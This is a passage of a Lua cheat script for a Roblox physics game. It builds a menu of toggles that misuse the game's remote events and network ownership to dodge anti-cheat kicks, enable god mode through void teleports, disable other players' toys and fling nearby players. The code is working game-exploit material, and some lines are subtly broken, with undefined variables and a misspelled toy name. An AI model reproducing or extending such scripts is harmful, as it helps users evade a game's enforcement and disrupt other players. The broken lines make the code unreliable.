        if bombEvents then
            bombEvents:Destroy()
        end

        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        local RunService = game:GetService("RunService")
        local LocalPlayer = Players.LocalPlayer

        local alreadyProcessed = {}
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local rangeRadius = 50

        local function isInRange(position)
            return (position - character.HumanoidRootPart.Position).Magnitude <= rangeRadius
        end

        RunService.RenderStepped:Connect(function()
            pcall(function()
                for _, player in ipairs(Players:GetPlayers()) do
                    if player == LocalPlayer then continue end

                    local toyFolder = Workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                    if not (toyFolder and toyFolder:IsA("Folder")) then continue end

                    for _, toy in ipairs(toyFolder:GetChildren()) do
                        if toy.Name ~= "BallSnowball" then continue end

                        for _, part in ipairs(toy:GetChildren()) do
                            if (part.Name == "SnowRagdollPart" or part.Name == "SoundPart") 
                                and not alreadyProcessed[part] then
                                
                                if isInRange(part.Position) then
                                    part.CanCollide = false
                                    part.CanQuery = false
                                    part.CanTouch = false
                                    part.Size = Vector3.zero
                                    alreadyProcessed[part] = true
                                end
                            end
                        end
                    end
                end
            end)
        end)
    end
})

-- ====================== 共通関数 ======================
function spawnItem(itemName, position)
    task.spawn(function()
        local cframe = CFrame.new(position)
        local rotation = Vector3.new(0, 90, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end

local function spawnItemCf(itemName, cframe)
    task.spawn(function()
        local rotation = Vector3.new(0, 0, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end

-- ====================== Anti Snowball V2 ======================
aaaa = 20

local BSATCoroutine, SSCoroutine

local function BSAT()
    pcall(function()
        local myToysFolder = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
        if not myToysFolder then return end

        -- 既存キャンプファイヤー削除
        if myToysFolder:FindFirstChild("Campfire") then
            pcall(function() DestroyT(myToysFolder:FindFirstChild("Campfire")) end)
            wait()
        end

        spawnItemCf("Campfire", playerCharacter.Head.CFrame)
        local campfire = myToysFolder:WaitForChild("Campfire")
        campfire.PrimaryPart = campfire:FindFirstChild("Main")

        local firePlayerPart
        for _, part in pairs(campfire:GetChildren()) do
            if part.Name == "FirePlayerPart" then
                part.Size = Vector3.new(0, 0, 0)
                firePlayerPart = part
                break
            end
        end

        if firePlayerPart then
            local originalPosition = playerCharacter.Torso.Position
            pcall(function() SetNetworkOwner:FireServer(firePlayerPart, firePlayerPart.CFrame) end)

            playerCharacter:MoveTo(firePlayerPart.Position)
            wait()
            playerCharacter:MoveTo(originalPosition)

            -- BodyPosition & BodyVelocity 設定
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.P = 200000
            bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
            bodyPosition.Parent = campfire.Main

            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(0, 0, 0)
            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            bodyVelocity.Parent = firePlayerPart
        end
    end)
end

DefTab:AddToggle({
    Name = "Anti Snowball V2",
    Default = false,
    Save = true,
    Callback = function(enabled)
        if enabled then
            -- BSAT実行
            if BSATCoroutine then coroutine.close(BSATCoroutine) end
            BSATCoroutine = coroutine.create(BSAT)
            coroutine.resume(BSATCoroutine)

            -- メインループ
            if SSCoroutine then coroutine.close(SSCoroutine) end
            SSCoroutine = coroutine.create(function()
                while true do
                    pcall(function()
                        local character = localPlayer.Character
                        if not (character and character:FindFirstChild("HumanoidRootPart")) then 
                            wait(0.2) 
                            return 
                        end

                        local root = character.HumanoidRootPart

                        for _, player in pairs(Players:GetPlayers()) do
                            if player == localPlayer then continue end

                            local toysFolder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                            if not toysFolder then continue end

                            for _, obj in pairs(toysFolder:GetChildren()) do
                                coroutine.wrap(function()
                                    if not (obj:IsA("Model") and obj.Name == "Campfire") then return end

                                    -- SoundPart処理
                                    local soundPart = obj:FindFirstChild("SoundPart")
                                    if soundPart and soundPart:IsA("BasePart") then
                                        local dist = (soundPart.Position - root.Position).Magnitude
                                        if dist <= aaaa then
                                            pcall(function() SetNetworkOwner:FireServer(soundPart, soundPart.CFrame) end)
                                            task.wait()
                                            local velocity = soundPart:FindFirstChild("l") or Instance.new("BodyVelocity", soundPart)
                                            velocity.Name = "l"
                                            velocity.Velocity = Vector3.new(0, 0, 0)
                                            velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                            Debris:AddItem(velocity, 0)
                                        end
                                    end

                                    -- FirePlayerPart処理
                                    local FirePlayerPart = obj:FindFirstChild("FirePlayerPart")
                                    if FirePlayerPart and FirePlayerPart:IsA("BasePart") then
                                        local dist = (FirePlayerPart.Position - root.Position).Magnitude
                                        if dist <= aaaa then
                                            pcall(function() SetNetworkOwner:FireServer(FirePlayerPart, FirePlayerPart.CFrame) end)
                                            task.wait()
                                            local velocity = FirePlayerPart:FindFirstChild("l") or Instance.new("BodyVelocity", FirePlayerPart)
                                            velocity.Name = "l"
                                            velocity.Velocity = Vector3.new(0, 0, 0)
                                            velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                            Debris:AddItem(velocity, 0)
                                        end
                                    end
                                end)()
                            end
                        end
                    end)
                    wait()
                end
            end)
            coroutine.resume(SSCoroutine)

        else
            -- オフ時クリーンアップ
            if BSATCoroutine then
                pcall(function() coroutine.close(BSATCoroutine) end)
                BSATCoroutine = nil
            end
            if SSCoroutine then
                pcall(function() coroutine.close(SSCoroutine) end)
                SSCoroutine = nil
            end
        end
    end
})

    Toggles["AntiExplodeT"] = DefTab:AddToggle({
        Name = "AntiExplode",
        Default = false,
        Save = true,
        Flag = "AntiExplodeT",
        Callback = function(Val)
            bool.AntiExplodeT = Val 
            if Val then 
                cons["AntiExplodeCon"] = RS.BombEvents.BombExplode.OnClientEvent:Connect(function()
                    hrp.Anchored = true
                    task.wait()
                    hrp.Anchored = false                   
                    if not hum.SeatPart then  
                        hum.Sit = false 
                    end
                    for i = 1, #etc.Limbs do
                        local limb = char:FindFirstChild(etc.Limbs[i])
                        if limb then
                            limb.RagdollLimbPart.CanCollide = false
                        end
                    end
                end)
            else    
                cons:disc("AntiExplodeCon") 
            end 
        end
    })
    
    DefTab:AddToggle({
    Name = "God Mode",
    Default = false,
    Save = true,
    Flag = "GodModeTeleport",
    Callback = function(Value)
        if Value then
            -- ON
            bool.GodMode = true
            etc.GodModeOriginalHeight = workspace.FallenPartsDestroyHeight
            workspace.FallenPartsDestroyHeight = 0 / 0

            if hrp then
                etc.GodModeLastCFrame = hrp.CFrame
            end

            cons["GodModeLoop"] = task.spawn(function()
                while bool.GodMode do
                    local char = plr.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if not root then
                        task.wait(0.5)
                        continue
                    end

                    if not etc.GodModeLastCFrame then
                        etc.GodModeLastCFrame = root.CFrame
                    end

                    local original = root.CFrame
                    local startTime = tick()
                    local radius = 10000

                    while tick() - startTime < 1 and bool.GodMode do
                        if not plr.Character or not root.Parent then break end
                        local t = tick() * 12
                        local x = math.cos(t) * radius
                        local z = math.sin(t) * radius
                        root.CFrame = original + Vector3.new(x, -10000, z)
                        RunService.RenderStepped:Wait()
                    end

                    if bool.GodMode and root and root.Parent then
                        root.CFrame = original
                    end

                    task.wait()
                end
            end)

            cons["GodModeChar"] = plr.CharacterAdded:Connect(function(character)
                if bool.GodMode then
                    task.wait(0.1)
                    local root = character:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.CFrame = CFrame.new(0, -15000, 0)
                    end
                end
            end)

            Notify("God Mode", "ON")
        else
            -- OFF
            bool.GodMode = false
            cons:cancel("GodModeLoop")
            cons:disc("GodModeChar")

            if hrp and etc.GodModeLastCFrame then
                hrp.CFrame = etc.GodModeLastCFrame
            end

            workspace.FallenPartsDestroyHeight = etc.GodModeOriginalHeight or -100
            Notify("God Mode", "OFF")
        end
    end
})
    Toggles["AdditionalAntiKickMethod"] = DefTab:AddDropdown({
        Name = "Additional-Antikick method",
        Default = "<font color=\"rgb(255, 0, 0)\"><b>[DEATH]</b></font>",
        Options = {"<font color=\"rgb(255, 0, 0)\"><b>[DEATH]</b></font>","<font color=\"rgb(0, 0, 255)\"><b>[SNO]</b></font>","<font color=\"rgb(0, 255, 0)\"><b>[FORCE TELEPORT]</b></font>"},
        Save = true,
        Flag = "AdditionalAntiKickMethod",
        Callback = function(Value)
            int.AddAntiKickMethod = Value
        end    
    })
    local function FindFloor()
        local rayOrigin = hrp.Position
        local rayDirection = Vector3.new(0, -500, 0)
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = {character}
        raycastParams.FilterType = Enum.RaycastFilterType.Exclude
        local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
        if raycastResult then 
            return raycastResult.Position + Vector3.new(0,2,0)
        else 
            return Vector3.new(0,2,0)
        end
    end

    Toggles["AdditionalAntiKick"] = DefTab:AddToggle({
        Name = "Additional-Antikick",
        Default = true,
        Save = true,
        Flag = "AdditionalAntiKick",
        Callback = function(Val)
            if Val then  
                cons["ADDANTIKICK"] = RS.GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(reason)
                    if reason == "Flying" then 
                        if int.AddAntiKickMethod == "<font color=\"rgb(255, 0, 0)\"><b>[DEATH]</b></font>" then
                            Struggle:FireServer("Unbind")
                            hum.Health = 0
                        elseif int.AddAntiKickMethod == "<font color=\"rgb(0, 0, 255)\"><b>[SNO]</b></font>" then 
                            for i = 1 ,100 do 
                                sno(hrp)
                                task.wait(0.01)
                            end
                        else 
                            local BodyVelocity = Instance.new("BodyVelocity")
                            BodyVelocity.P = 10000
                            BodyVelocity.MaxForce = Vector3.new(Huge())
                            BodyVelocity.Velocity = Vector3.new(0,-1000,0)
                            while (hum) and hum.FloorMaterial == Enum.Material.Air do task.wait() end
                            if BodyVelocity and BodyVelocity.Parent ~= nil then 
                                for _,v in pairs(hrp:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
                            end
                        end
                    end
                end)
            else 
                cons:disc("ADDANTIKICK")
            end
        end
    })
 
    
    local function ClearKunai()
        for _, v in pairs(inv:GetChildren()) do
            if v.Name == "AntiKick" or v.Name == "NinjaShuriken" or v.Name == "WaitingForChild" then
                DestroyToy:FireServer(v)
                if v:IsDescendantOf(game) then
                    Debris:AddItem(v, 0)
                end
            end
        end
    end
    int.MainAntiKickColor = Color3.fromRGB(255, 0, 255)
    int.PyramidAntiKickColor = Color3.fromRGB(255, 212, 127)
    local function HighlightKunai(kunai,Part1Weld) 
        if kunai and Part1Weld and Part1Weld == hrp.FirePlayerPart and kunai.Name ~= "AntiKick" then  
            kunai.Name = "AntiKick"
            for _, obj in ipairs(kunai:GetChildren()) do
                if obj:IsA("BasePart") then
                    obj.CanTouch = false
                    obj.CanCollide = false
                    obj.CanQuery = false
                    if obj.Name == "Main" or obj.Name == "Pyramid" then
                        obj.Transparency = 0
                        local high = Instance.new("Highlight")
                        high.FillColor = (obj.Name == "Main") and int.MainAntiKickColor or int.PyramidAntiKickColor
                        high.Parent = obj
                    else
                        obj.Transparency = 1
                    end
                end
            end
            task.spawn(RenameInShop,kunai,"NinjaShuriken","AntiKick")
        end
    end

    local function StickKunai(kunai)
        local StickyPart = kunai:FindFirstChild("StickyPart")
        local StickyWeld = StickyPart and FWD(StickyPart,"StickyWeld",0.2)
        local FirePlayerPart = hrp and hrp:FindFirstChild("FirePlayerPart")
        local Part1Weld,PartOwner
        if not(StickyWeld) or not(FirePlayerPart) then 
            kunai.Name = "AntiKick"
            return false
        end   
        sno(StickyPart)
        StickyEvent:FireServer(StickyPart, FirePlayerPart, CFrame.Angles(0, math.rad(90), math.rad(90)))
        local EndTick = tick() + 0.7
        while RunService.Heartbeat:Wait() do 
            StickyWeld = StickyPart and StickyPart:FindFirstChild("StickyWeld")
            PartOwner = StickyPart and StickyPart:FindFirstChild("PartOwner")
            Part1Weld = StickyWeld and StickyWeld.Part1
            if PartOwner and PartOwner.Value ~= plr.Name then 
                sno(StickyPart)
                StickyEvent:FireServer(StickyPart, FirePlayerPart, CFrame.Angles(0, math.rad(90), math.rad(90)))
                EndTick = tick() + 0.7
            end
            if not(StickyWeld) or Part1Weld or (tick() >= EndTick) or (GetMagnitude(StickyPart,(etc.MyPCLD or hrp)) > 20) then  
                break
            end
        end
        task.spawn(HighlightKunai,kunai,Part1Weld)
        -- return Part1Weld == FirePlayerPart
    end

    -- Toggles["AntiKick"] = DefTab:AddToggle({
    --     Name = "AntiKick<font color=\"rgb(0, 255, 0)\"><b>[SHURIKEN]</b></font>",
    --     Default = false,
    --     Save = true,
    --     Flag = "AntiKick",
    --     Callback = function(Val)
    --         bool.AntiKick = Val
    --         local kunai, StickyPart, StickyWeld, Part1Weld
    --         task.spawn(function() 
    --             while bool.AntiKick and RunService.Heartbeat:Wait() do
    --                 if not hrp or not hum or hum.Health == 0 then continue end  
    --                 if InPlot.Value and not InOwnedPlot.Value then 
    --                     continue
    --                 elseif InOwnedPlot.Value then 
    --                     local House = CheckForHome()
    --                     kunai = House and House:FindFirstChild("AntiKick")
    --                 else  
    --                     kunai = inv:FindFirstChild("AntiKick")
    --                 end

    --                 if kunai then 
    --                     StickyPart = kunai:FindFirstChild("StickyPart")
    --                     StickyWeld = StickyPart and StickyPart:FindFirstChild("StickyWeld")
    --                     Part1Weld = StickyWeld and StickyWeld.Part1

    --                     if Part1Weld ~= hrp.FirePlayerPart then
    --                         if (StickyPart) and GetMagnitude(StickyPart,(etc.MyPCLD or hrp)) <= 20 then
    --                             StickKunai(kunai)
    --                         else
    --                             task.spawn(ClearKunai)
    --                             kunai = SpawnToy("NinjaShuriken")
    --                             if kunai then StickKunai(kunai) end
    --                         end
    --                     end
    --                 else 
    --                     task.spawn(ClearKunai)
    --                     kunai = SpawnToy("NinjaShuriken")
    --                     if kunai then StickKunai(kunai) end
    --                 end 
    --             end
                
    --             if not bool.AntiKick then
    --                 task.spawn(ClearKunai)
    --             end
    --         end)
    --     end
    -- })
    local function EnsureStuck(kunai)
        local StickyPart = kunai:FindFirstChild("StickyPart")
        if not StickyPart then return false end
        local FirePlayerPart = hrp and hrp:FindFirstChild("FirePlayerPart")
        if not FirePlayerPart then return false end
        local StickyWeld = StickyPart:FindFirstChild("StickyWeld")

        if StickyWeld and StickyWeld.Part1 == FirePlayerPart then
            return true
        end
        StickKunai(kunai)
        return false
    end

    Toggles["AntiKick"] = DefTab:AddToggle({
        Name = "AntiKick<font color=\"rgb(0, 255, 0)\"><b>[SHURIKEN]</b></font>",
        Default = false,
        Save = true,
        Flag = "AntiKick",
        Callback = function(Val)
            bool.AntiKick = Val 
            task.spawn(function() 
                while bool.AntiKick do
                    RunService.Heartbeat:Wait()
                    if not hrp or not hum or hum.Health <= 0 then continue end  
                    local kunai
                    if InOwnedPlot.Value then 
                        local House = CheckForHome()
                        kunai = House and House:FindFirstChild("AntiKick")
                    elseif not InPlot.Value then
                        kunai = inv:FindFirstChild("AntiKick")
                    else 
                        continue
                    end
                    if kunai then 
                        local StickyPart = kunai:FindFirstChild("StickyPart")
                        if StickyPart and GetMagnitude(StickyPart,hrp) > 30 then
                            task.spawn(ClearKunai)
                            SpawnToy("NinjaShuriken")
                        else
                            EnsureStuck(kunai)
                        end
                    else 
                        task.spawn(ClearKunai)
                        local newKunai = SpawnToy("NinjaShuriken")
                        if newKunai then EnsureStuck(newKunai) end
                    end 
                end
                task.spawn(ClearKunai)
            end)
        end
    })
    Toggles["AntiKick2"] = DefTab:AddToggle({
        Name = "AntiKICK[2]",
        Default = false,
        Save = true,
        Flag = "Antikick2",
        Callback = function(Val)
        task.wait(0.1)
        bool.antikick = Val
        if bool.antikick then
            task.spawn(function()
                task.wait(0.1)
                if not inv:FindFirstChild("NinjaShuriken1") then
                    repeat task.wait() until plr.CanSpawnToy.Value
                    local shu
                    local part
                    local plot = CheckForHome()
                    while bool.antikick and task.wait() do
                        pcall(function()
                            local char = plr.Character
                            if not shu or not inv:FindFirstChild("NinjaShuriken1") and not workspace.PlotItems:FindFirstChild("NinjaShuriken1", true) then
                                print(1)
                                shu = SpawnToy("NinjaShuriken")
                                shu.Name = "NinjaShuriken1"
                                part = shu:WaitForChild("StickyPart", 0.3)
                                sno(part)
                            end
                            if shu and shu:FindFirstChild("StickyPart") and shu.StickyPart:FindFirstChild("PartOwner") and shu.StickyPart:FindFirstChild("PartOwner").Value ~= plr.Name then
                                print(2)
                                sno(part)
                            end
                            if part and part:FindFirstChild("StickyWeld") and part.StickyWeld.Part1 ~= char.HumanoidRootPart.FirePlayerPart then
                                print(3)
                                sno(part)
                                StickyEvent:FireServer(part, char.HumanoidRootPart.FirePlayerPart, CFrame.new(0,0,0,1,0,0,0,0,-1,0,1,0))
                            end
                            task.wait(0.2)
                            if shu and shu:FindFirstChild("StickyPart") and (shi.StickyPart.Position - HRP.Position).Magnitude > 30 then
                                print(4)
                                DestroyToy:FireServer(inv.NinjaShuriken1)
                                shu = SpawnToy("NinjaShuriken ")
                                part = shu:WaitForChild("StickyPart", 0.3)
                                shu.Name = "NinjaShuriken1"
                                sno(part)
                            end
                        end)
                    end
                end
            end)
        else
            if inv:FindFirstChild("NinjaShuriken1") then DestroyToy:FireServer(inv.NinjaShuriken1) end
        end
        end
    })
    Toggles["AntiKick"] = DefTab:AddToggle({
        Name = "AntiKick<font color=\"rgb(0, 255, 0)\"><b>[ITEM]</b></font>",
        Default = false,
        Save = true,
        Flag = "AntiKickItem",
        Callback = function(Val)
            bool.AntiKickItem = Val 
            task.spawn(function()
                local Item,SoundPart,Weld
                while bool.AntiKickItem and task.wait() do 
                    if not hrp or not hum or hum.Health == 0 then continue end  
                    if InPlot.Value then continue end 
                    Item = inv:FindFirstChild("AntiKickItem") 
                    SoundPart = Item and Item:FindFirstChild("Hitbox")
                    if not(Item) or not(SoundPart) then
                        for _,v in pairs(inv:GetChildren()) do 
                            if v.Name == "AntiKickItem" then 
                                DestroyToy:FireServer(v)
                            end
                        end
                        Item = SpawnToy("SpookyCandle1")
                        if not Item then continue end 
                        SoundPart = Item and FWD(Item,"Hitbox",0.5)
                        sno(SoundPart)
                        Weld = Instance.new("WeldConstraint")
                        for _,v in pairs(Item:GetChildren()) do 
                            if v:IsA("BasePart") then 
                                v.CanCollide = false 
                                v.CanQuery = false
                                v.Transparency = 0.8
                            end
                        end
                        SoundPart.CFrame = (etc["MyPCLD"] or hrp).CFrame 
                        Weld.Part0 = SoundPart
                        Weld.Part1 = (etc["MyPCLD"] or hrp.FirePlayerPart)
                        Weld.Parent = SoundPart
                        Weld.Name = "WeldBlabla"
                        Item.Name = "AntiKickItem"
                    end
                    Weld = SoundPart and SoundPart:FindFirstChild("WeldBlabla")
                    if not CheckNetworkOwnerOnPart(SoundPart) then 
                        sno(SoundPart)
                    end
                    if Weld and Weld.Part1 ~= (etc["MyPCLD"] or hrp.FirePlayerPart) then
                        Weld.Enabled = false 
                        SoundPart.CFrame = (etc["MyPCLD"] or hrp).CFrame 
                        Weld.Part1 = (etc["MyPCLD"] or hrp.FirePlayerPart)
                        Weld.Enabled = true
                    end
                end
            end)
        end
    })

-- === Anti Blobman Kill ===
Toggles["AntiBlobmanKill"] = DefTab:AddToggle({
    Name = "Anti Kill [BLOB] ",
    Default = false,
    Save = true,
    Flag = "AntiBlobmanKill",
    Callback = function(Value)
        bool.AntiBlobmanKill = Value
        
        if Value then
            cons:cancel("AntiBlobmanKill")
            cons["AntiBlobmanKill"] = task.spawn(function()
                while bool.AntiBlobmanKill and task.wait() do
                    local char = plr.Character
                    if not char then continue end
                    
                    local hum = char:FindFirstChild("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    
                    if hum and hrp and hum.Health > 0 then
                        hum.Sit = true
                        pcall(function()
                            hum:ChangeState(Enum.HumanoidStateType.Running)
                        end)
                        
                        local camera = workspace.CurrentCamera
                        if camera then
                            local lookVec = camera.CFrame.LookVector
                            hrp.CFrame = CFrame.new(
                                hrp.Position,
                                hrp.Position + Vector3.new(lookVec.X, 0, lookVec.Z)
                            )
                        end
                    end
                end
            end)
        else
            cons:cancel("AntiBlobmanKill")
            
            local char = plr.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum and hum.Health > 0 then
                hum.Sit = false
                pcall(function()
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end
        end
    end
})
    
    Toggles["AntiBlob"] = DefTab:AddToggle({
        Name = "AntiBlob",
        Default = false,
        Save = true,
        Flag = "AntiBlob",
        Callback = function(Val)
            bool.AntiBlob = Val
            for _,v in (Players:GetChildren()) do 
                if v == plr then continue end 
                for _,x in pairs(workspace[v.Name.."SpawnedInToys"]:GetChildren()) do 
                    if x.Name == "CreatureBlobman" then  
                        local RightDetector,LeftDetector = x:FindFirstChild("RightDetector"),x:FindFirstChild("LeftDetector")
                        if RightDetector and LeftDetector then  
                            RightDetector.RightWeld.Enabled = not(bool.AntiBlob)
                            RightDetector.RightAlignOrientation.Enabled = not(bool.AntiBlob)  
                            RightDetector.RightAlignOrientation.RigidityEnabled = not(bool.AntiBlob)
                            LeftDetector.LeftWeld.Enabled = not(bool.AntiBlob)
                            LeftDetector.LeftAlignOrientation.Enabled = not(bool.AntiBlob)
                            LeftDetector.LeftAlignOrientation.RigidityEnabled = not(bool.AntiBlob)
                        end
                    end
                end
            end
            for i = 1,5 do 
                for _,y in pairs(workspace.Plots["Plot"..i]:GetChildren()) do 
                    if y.Name == "CreatureBlobman" then  
                        local LeftDetector,RightDetector = y:FindFirstChild("LeftDetector"),y:FindFirstChild("RightDetector")
                        if LeftDetector and RightDetector then  
                            RightDetector.RightWeld.Enabled = not(bool.AntiBlob)
                            RightDetector.RightAlignOrientation.Enabled = not(bool.AntiBlob)
                            RightDetector.RightAlignOrientation.RigidityEnabled = not(bool.AntiBlob)
                            LeftDetector.LeftWeld.Enabled = not(bool.AntiBlob)
                            LeftDetector.LeftAlignOrientation.Enabled = not(bool.AntiBlob)
                            LeftDetector.LeftAlignOrientation.RigidityEnabled = not(bool.AntiBlob)
                        end
                    end
                end
            end
        end
    })
    
    Toggles["LoopTpHouse"] = DefTab:AddDropdown({
        Name = "House to loopTP",
        Default = "Green House",
        Options = {"Green House", "Pink HouseWitch House","Blue House","China House"},
        Save = true,
        Flag = "LoopTpHouse",
        Callback = function(Value)
            if etc.MapPoints[Value] then 
                int.LoopTpCFrame = etc.MapPoints[Value]
            end
        end    
    })
    
    DefTab:AddButton({
    Name = "Anti spawn kill",
    Callback = function()
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local HRP = Character:WaitForChild("HumanoidRootPart")

        local flingSpeed = 3000000
        pcall(function()
            for _, part in pairs(Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part:SetNetworkOwner(LocalPlayer)
                end
            end
        end)

        RunService.Stepped:Connect(function()
            HRP.Velocity = Vector3.new(100, 20, 100)
            HRP.RotVelocity = Vector3.new(flingSpeed, flingSpeed, flingSpeed)
        end)
    end
})

    DefTab:AddToggle({
        Name = "AntiLoopKill<font color=\"rgb(255, 0, 0)\"><b>[LoopTP]</b></font>",
        Default = false,
        Callback = function(Val)
            bool.LoopTpToHouse = Val 
            local char 
            task.spawn(function()
            if bool.LoopTpToHouse then
                cons["AntiLoppKillLOOPTP"] = RunService.Heartbeat:Connect(function()
                    char = plr.Character 
                    if not char then return end 
                    char:PivotTo(int.LoopTpCFrame)
                end)
            else 
                cons:disc("AntiLoppKillLOOPTP")
                pcall(StopVelocityF)
            end
            end)
        end
    })   

    DefTab:AddToggle({
        Name = "AntiLoopKill<font color=\"rgb(0, 0, 255)\"><b>[RANDOM]</b></font>",
        Default = false,
        Callback = function(Val)
            bool.LoopTpRandom = Val  
            task.spawn(function() 
                if bool.LoopTpRandom then
                    local char = plr.Character 
                    local oldCF = char:GetPivot()
                    while bool.LoopTpRandom do
                        for _,CF in pairs(etc.MapPoints) do  
                            char = plr.Character 
                            if not char then 
                                while not plr.Character do task.wait() end 
                                char = plr.Character
                            end
                            char:PivotTo(CF)
                            task.wait(0.1)
                        end
                    end
                    StopAllVelocity(char)
                end
            end)
        end
    })
    DefTab:AddToggle({
        Name = "AntiLoopKill<font color=\"rgb(255, 0, 255)\"><b>[VOID]</b></font>",
        Default = false,
        Callback = function(Val)
            bool.LoopTpRandom1 = Val  
            local oldHeight = workspace.FallenPartsDestroyHeight
            task.spawn(function()
            if bool.LoopTpRandom1 then
                oldHeight = 0/0
                while bool.LoopTpRandom1 do
                    local char = plr.Character 
                    if not char then continue end 
                    char:PivotTo(CFrame.new(0,-75000000,-500000))
                    task.wait(0.05)
                    char:PivotTo(CFrame.new(0,-75000000,500000))
                    task.wait(0.05)
                    char:PivotTo(CFrame.new(500000,-75000000,0))
                    task.wait(0.05)
                    char:PivotTo(CFrame.new(-500000,-75000000,0))
                    task.wait(0.05)
                    char:PivotTo(CFrame.new(-500000,-75000000,-500000))
                    task.wait(0.05)
                    char:PivotTo(CFrame.new(500000,-75000000,500000))
                    task.wait(0.05)
                end
                StopAllVelocity(char)
                workspace.FallenPartsDestroyHeight = oldHeight
            end
            end)
        end
    })
    
   DefTab:AddSection({Name = "<font color=\"rgb(0, 180, 60)\"><b>Protection 2</b></font>"})


    
local AntiFlingVoid = false

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer


DefTab:AddToggle({
    Name = "Anti Fling",
    Default = false,

    Callback = function(state)
        AntiFlingVoid = state

        local char = player.Character
        if not char then return end

        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end


        if state then

            local savedCFrame = hrp.CFrame

            task.spawn(function()

                while AntiFlingVoid do

                    if hrp and hrp.Parent then

                        local velocity = hrp.AssemblyLinearVelocity

                        -- 強い飛ばし検知
                        if velocity.Magnitude > 80 then

                            hrp.Anchored = true

                            task.wait()

                            -- 元位置へ復帰
                            hrp.CFrame = savedCFrame

                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero

                            task.wait(.05)

                            hrp.Anchored = false
                        end
                    end

                    task.wait()
                end

            end)

        else

            if hrp then
                hrp.Anchored = false
            end

        end
    end
})


player.CharacterAdded:Connect(function(char)

    if AntiFlingVoid then

        local hrp = char:WaitForChild("HumanoidRootPart")

        task.wait(.5)

        local saved = hrp.CFrame

        RunService.Heartbeat:Connect(function()

            if AntiFlingVoid and hrp.Parent then

                if hrp.AssemblyLinearVelocity.Magnitude > 80 then

                    hrp.Anchored = true

                    hrp.CFrame = saved

                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero

                    task.wait(.05)

                    hrp.Anchored = false
                end
            end

        end)

    end

end)
    
    Toggles["AntiPaint"] = DefTab:AddToggle({
        Name = "AntiPaint",
        Default = false,
        Save = true,
        Flag = "AntiPaint",
        Callback = function(Val)
            bool.AntiPaint = Val
            if Val then  
                for _,v in pairs(game.Players:GetPlayers()) do 
                    local invPlr = workspace[v.Name.."SpawnedInToys"]
                    if invPlr then  
                        for _,x in pairs(invPlr:GetDescendants()) do  
                            if x.Name == "PaintPlayerPart" then  
                                x:Destroy()
                            end
                        end
                    end
                end
                for i = 1,5 do  
                    for _,v in pairs(workspace.Plots["Plot"..i]:GetDescendants()) do  
                        if v.Name == "PaintPlayerPart" then  
                            v:Destroy()
                        end
                    end
                end
            end
        end
    })

    local function SetupAntiBurn(char)
        cons:disc("AntiBurn")
        if not hum then 
            while not hum do task.wait() end 
        end
        local FireDebounce = hum and FWD(hum,"FireDebounce")
        if not FireDebounce then return end
        local Barrier = workspace.Map.Hole.PoisonBigHole.ExtinguishPart
        if not Barrier then warn("[DEBUG] ÐÐ°ÐºÐ¾Ð³Ð¾ ÑÑÑ??") return end 
        if CFP(Barrier,"Tex") then 
            Barrier.Tex:Destroy()
        end
        local OldPos = Barrier.Position
        cons["AntiBurn"] = FireDebounce:GetPropertyChangedSignal("Value"):Connect(function()
            FireDebounce = hum and hum:FindFirstChild("FireDebounce")
            if FireDebounce.Value and not bool.WorkingOnFire then  
                bool.WorkingOnFire = true
                Barrier.Transparency = 1
                while (FireDebounce and FireDebounce.Value) and not CFP(hrp,"FireLight") do task.wait(); print("Waiting") end 
                while (FireDebounce and FireDebounce.Value) and (hrp and CFP(hrp,"FireLight")) and task.wait() do 
                    Barrier.Position = hrp.FirePlayerPart.Position
                end
                Barrier.Position = OldPos   
                bool.WorkingOnFire = false
            end
        end)
    end
    DefTab:AddToggle({
        Name = "AntiBurn",
        Default = false,
        Save = true,
        Flag = "AntiBurn",
        Callback = function(Val)

            if Val then  
                if char then  
                    SetupAntiBurn(char)
                end
                cons["AntiBurnHelper"] = plr.CharacterAdded:Connect(SetupAntiBurn)
            else  
                cons:disc("AntiBurnHelper")
                cons:disc("AntiBurn")
            end
        end
    })
    Toggles["AntiVoid"] = DefTab:AddToggle({
        Name = "AntiVoid",
        Default = false,
        Save = true,
        Flag = "AntiVoid",
        Callback = function(Val)
            bool.AntiVoidEnabled = Val
            workspace.FallenPartsDestroyHeight = Val and 0/0 or -100
        end
    })
    Toggles["AntiBarrier"] = DefTab:AddToggle({
        Name = "AntiBarrier",
        Default = false,
        Save = true,
        Flag = "AntiBarrier",
        Callback = function(Value)
            for i = 1 ,5 do 
                local barrier = FWD(FWD(workspace.Plots,"Plot"..i),"Barrier")
